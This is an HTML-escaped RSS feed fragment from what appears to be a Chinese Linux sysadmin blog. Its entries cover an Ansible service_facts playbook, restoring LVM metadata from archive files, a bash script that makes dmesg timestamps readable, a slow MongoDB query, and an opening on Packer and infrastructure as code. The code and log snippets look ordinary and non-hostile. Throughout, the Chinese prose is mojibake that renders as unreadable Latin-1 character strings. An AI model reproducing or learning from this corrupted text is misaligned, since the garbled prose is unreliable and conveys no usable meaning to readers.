&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - name: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Stop {{ local__service }} service&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        systemd:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          service: &lt;span class=&#34;s2&#34;&gt;&amp;#34;{{ local__service }}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          state: stopped
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - name: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Populate ansible_facts.services variable&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ansible.builtin.service_facts:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - name: &lt;span class=&#34;s2&#34;&gt;&amp;#34;{{ local__service }} state will be stopped as expected&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        assert:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          that:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            ansible_facts.services&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;local__service&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;.state &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;stopped&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - name: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Start {{ local__service }} service&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        systemd:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          service: &lt;span class=&#34;s2&#34;&gt;&amp;#34;{{ local__service }}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          state: started
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - name: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Registered {{ local__service }} state will still be stopped as it was not refreshed&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        assert:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          that:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            ansible_facts.services&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;local__service&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;.state &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;stopped&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - name: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Refresh ansible_facts.services variable&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ansible.builtin.service_facts:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - name: &lt;span class=&#34;s2&#34;&gt;&amp;#34;{{ local__service }} state will be running as expected&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        assert:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          that:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            ansible_facts.services&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;local__service&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;.state &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;running&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢çš„ playbook ä¸€å…±æœ‰7æ­¥ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>LVMç³»ç»Ÿçš„Restore</title>
      <link>https://rendoumi.com/posts/20220728-lvm_restore/</link>
      <pubDate>Thu, 28 Jul 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220728-lvm_restore/</guid>
      <description>&lt;p&gt;åœ¨ç”Ÿäº§ç³»ç»Ÿä¸­ä½¿ç”¨LVMåŠ¡å¿…è¦æ³¨æ„lvm metadataçš„å¤‡ä»½ï¼Œæ›¾ç»åœ¨äº¬ä¸œçš„æ—¶å€™å‘ç”Ÿè¿‡è™šæœºç”¨äº†lvmçš„ç£ç›˜ç³»ç»Ÿï¼Œç„¶åè™šæœºæ–‡ä»¶qcow2çªç„¶åæ‰äº†ï¼Œæƒ³å°½äº†åŠæ³•ä¹Ÿæ— æ³•æ¢å¤ï¼Œè¿™ç»™æˆ‘ä»¬æ‹‰å“äº†è­¦é’Ÿå•Šï¼Œä½¿ç”¨lvmçš„æ—¶å€™åŠ¡å¿…è¦å¤‡ä»½åˆ†åŒºä¿¡æ¯ï¼Œå¦åˆ™åçš„æ—¶å€™å°±æ¬²å“­æ— æ³ªäº†ã€‚&lt;/p&gt;
&lt;p&gt;ç¼ºçœåœ¨ /etc/lvm/backup/ ç›®å½•ä¸‹æ˜¯æœ€æ–°çš„å¤‡ä»½ï¼ŒåŒæ ·å†å²ç‰ˆæœ¬éƒ½åœ¨ /etc/lvm/archive/ ç›®å½•ä¸‹ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä¸€å…ˆå¤‡ä»½&#34;&gt;ä¸€ã€å…ˆå¤‡ä»½&lt;/h4&gt;
&lt;p&gt;åœ¨å¼€å§‹æ¢å¤ä¹‹å‰ï¼Œä¸€å®šå…ˆåšä¸ªå¤‡ä»½&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp -pr /etc/lvm /etc/lvm_bkp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå»çœ‹çœ‹archiveä¸‹çš„å¤‡ä»½ä¿¡æ¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -l /etc/lvm/archive/vg_storage_00*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-------. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;13722&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 23:45 /etc/lvm/archive/vg_storage_00419-1760023262.vg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-------. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;14571&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 23:52 /etc/lvm/archive/vg_storage_00420-94024216.vg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-------. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;14749&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 15:11 /etc/lvm/archive/vg_storage_00676-394223172.vg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-------. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;14733&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 15:29 /etc/lvm/archive/vg_storage_00677-187019982.vg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;äºŒæœ€åçš„æƒ…å½¢æ¢å¤pv&#34;&gt;äºŒã€æœ€åçš„æƒ…å½¢æ¢å¤pv&lt;/h4&gt;
&lt;p&gt;è­¦å‘Šï¼šè¿™ä¸€æ­¥åªèƒ½åœ¨VGæ— æ³•æ­£å¸¸è¿è¡Œçš„æ—¶å€™å†è¿è¡Œï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;å…ˆè¯´æœ€åçš„æƒ…å½¢ï¼ŒLVMçš„å»ºç«‹è·¯å¾„æ˜¯ pv &amp;mdash;&amp;gt; vg &amp;mdash;&amp;gt; lvï¼Œå‡è®¾è¿ pvï¼ˆç‰©ç†å·éƒ½æ²¡äº†ï¼‰&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„å¤‡ä»½ï¼Œ/etc/lvm/archive/vg_storage_00677-187019982.vg&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;less /etc/lvm/archive/vg_storage_00677-187019982.vg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   physical_volumes &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      pv0 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»é‡Œé¢æ‹¿åˆ° pv çš„ id ï¼Œé‡å»º pv&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pvcreate --uuid &lt;span class=&#34;s2&#34;&gt;&amp;#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --restorefile /etc/lvm/archive/vg_storage_00677-187019982.vg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¸‰æ¢å¤vg&#34;&gt;ä¸‰ã€æ¢å¤VG&lt;/h4&gt;
&lt;p&gt;å¦‚æœ vg æ˜¯æ­£å¸¸çš„ï¼Œé‚£ä¹ˆå°±ä¸ç”¨åšç¬¬äºŒæ­¥äº†ï¼Œç›´æ¥ä»å¤‡ä»½ä¸­æ¢å¤å³å¯ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹&lt;/p&gt;</description>
    </item>
    <item>
      <title>dmesg -T æ— æ—¶é—´æˆ³çš„è§£å†³æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20220725-dmesg_time/</link>
      <pubDate>Mon, 25 Jul 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220725-dmesg_time/</guid>
      <description>&lt;p&gt;ç°åœ¨ç‰ˆæœ¬çš„ dmesg -T éƒ½æ˜¯å¸¦æ—¶é—´æˆ³çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220725172454313&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220725-dmesg_time/image-20220725172454313.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯è€çš„æœºå™¨ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯æ²¡æœ‰ -T è¿™ä¸ªå‚æ•°çš„ï¼Œç›´æ¥ dmesg æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220725172554722&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220725-dmesg_time/image-20220725172554722.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ—¶é—´æˆ³æ˜¯å¤©ä¹¦å•Šï¼Œè¿™è¿˜ç®—å¥½çš„ï¼Œå¥½æ­¹æœ‰ã€‚è¿˜æœ‰æ›´å·®çš„ï¼Œè¿æˆ³å­éƒ½æ²¡æœ‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220725172816958&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220725-dmesg_time/image-20220725172816958.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ³å­éƒ½æ²¡æœ‰çš„ï¼Œéœ€è¦åšä»¥ä¸‹æ­¥éª¤æ¥åŠ ä¸Šï¼Œæœºå™¨é‡å¯åå¿…é¡»å†æ‰§è¡Œä¸€éï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &amp;gt; /sys/module/printk/parameters/printk_time
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŒæ—¶å†™ä¸ªè„šæœ¬ï¼Œ/usr/local/bin/dmesgt.sh&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# Translate dmesg timestamps to human readable format&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# desired date format&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;date_format&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%a %b %d %T %Y&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# uptime in seconds&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uptime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;cut -d &lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; -f &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; /proc/uptime&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# run only if timestamps are enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Y&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;cat /sys/module/printk/parameters/time&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  dmesg &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sed &lt;span class=&#34;s2&#34;&gt;&amp;#34;s/^\[[ ]*\?\([0-9.]*\)\] \(.*\)/\\1 \\2/&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; timestamp message&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[%s] %s\n&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date --date &lt;span class=&#34;s2&#34;&gt;&amp;#34;now - &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$uptime&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; seconds + &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$timestamp&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; seconds&amp;#34;&lt;/span&gt; +&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;date_format&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$message&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Timestamps are disabled (/sys/module/printk/parameters/time)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±å¯ä»¥äº†ï¼Œæœ€åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä¸€æ¬¡mongodb cpuå¾ˆhighçš„è§£å†³æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20220721-mongodb_cpu/</link>
      <pubDate>Thu, 21 Jul 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220721-mongodb_cpu/</guid>
      <description>&lt;p&gt;æ¥åˆ°åŒäº‹çš„é€šçŸ¥ï¼Œè¯´mongodbçš„cpuå¾ˆé«˜ï¼Œä¸‹ä¸å»ï¼Œçœ‹æœ‰ä»€ä¹ˆåŠæ³•ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹äº†ä¸€ä¸‹å›¾ï¼Œcpuéƒ½99.4%äº†ï¼Œç¡®å®å¾ˆé«˜ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220721152856848&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220721-mongodb_cpu/image-20220721152856848.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç™»ä¸Šæœºå™¨ï¼Œé¦–å…ˆå»çœ‹mongodçš„logï¼Œéƒ½è¯•å¦‚ä¸‹çš„æŸ¥è¯¢ï¼Œéƒ½å¾ˆæ…¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220721153814123&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220721-mongodb_cpu/image-20220721153814123.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;copyå‡ºä¸€æ¡æ¥ï¼Œå¤‡ç”¨&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-log&#34; data-lang=&#34;log&#34;&gt;2022-07-17T21:30:42.556+0800 I COMMAND  [conn196670] command beyou.behaviorAnalysis command: find { find: &amp;#34;behaviorAnalysis&amp;#34;, filter: { behavior: { $regex: &amp;#34;.*äº’åŠ¨æ“ä½œ.*&amp;#34;, $options: &amp;#34;i&amp;#34; }, log: { $regex: &amp;#34;.*\Qè§‚çœ‹ï¼šã€Šç½—é©¬çš„æˆ¿å­ã€‹,\E.*&amp;#34;, $options: &amp;#34;i&amp;#34; }, userId: 7345, _class: { $in: [ &amp;#34;com.linkyee.api.domain.po.BehaviorAnalysis&amp;#34; ] } }, $db: &amp;#34;beyou&amp;#34; } planSummary: IXSCAN { _class: 1, behavior: 1, log: 1, userId: 1 } keysExamined:111564 docsExamined:2 cursorExhausted:1 numYields:890 nreturned:2 reslen:571 locks:{ Global: { acquireCount: { r: 891 } }, Database: { acquireCount: { r: 891 } }, Collection: { acquireCount: { r: 891 } } } storage:{} protocol:op_msg 2268ms
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å‘ç°ç¡®å®å¾ˆæ…¢å•Šï¼Œop_msg å±…ç„¶è¦2268msï¼Œä½†æ˜¯mongodbçš„æ•°æ®ç›®å½•æ€»å…±æ‰6Gå¤šï¼Œä¸å®¢è§‚å•Šã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Infrastructure as Codeä¸­packerçš„ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20220717-terraform/</link>
      <pubDate>Sun, 17 Jul 2022 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220717-terraform/</guid>
      <description>&lt;p&gt;å…ˆæ™®åŠä¸€ä¸‹æ¦‚å¿µï¼ŒInfrastructure as Codeï¼Œä¹Ÿå°±æ˜¯ä»ä»£ç å¼€å§‹å®šä¹‰æ•´ä¸ªç½‘ç»œç¯å¢ƒã€è™šæœºã€å„ç§èµ„æºç­‰ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;ç®€å•è¯´å°±æ˜¯åœ¨äº‘ä¸Šç”¨ä»£ç æ¥ç®¡ç†ä¸€åˆ‡ï¼Œæ— è®ºæ˜¯vpcã€subnetworkã€lbã€snatã€sgã€ec2&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;éå¸¸ç¬¦åˆæˆ‘çš„èƒƒå£ï¼Œå› ä¸ºå°±è¿æ¶æ„å›¾ï¼Œéƒ½æ˜¯ç”¨ graphviz æ¥ç”»çš„ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆ Infrastructure as Code ï¼ˆIACï¼‰ å¯ä»¥åˆ†ä¸ºä»¥ä¸‹äº”ä¸ªéƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ad hoc scripts&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Configuration Management tools&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Orchestration tools&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Provisioning tools&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Server Templating tools&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ä¸€ad-hoc-scripts&#34;&gt;ä¸€ã€Ad hoc scripts&lt;/h4&gt;
&lt;p&gt;å°±æ˜¯ç”¨è½¯ä»¶å¯¹ç›®çš„ä¸»æœºè¿›è¡Œ point to point æ“ä½œï¼Œç”¨shellæˆ–è€…ansibleéƒ½å¯ä»¥ã€‚æ¨èansibleã€‚&lt;/p&gt;
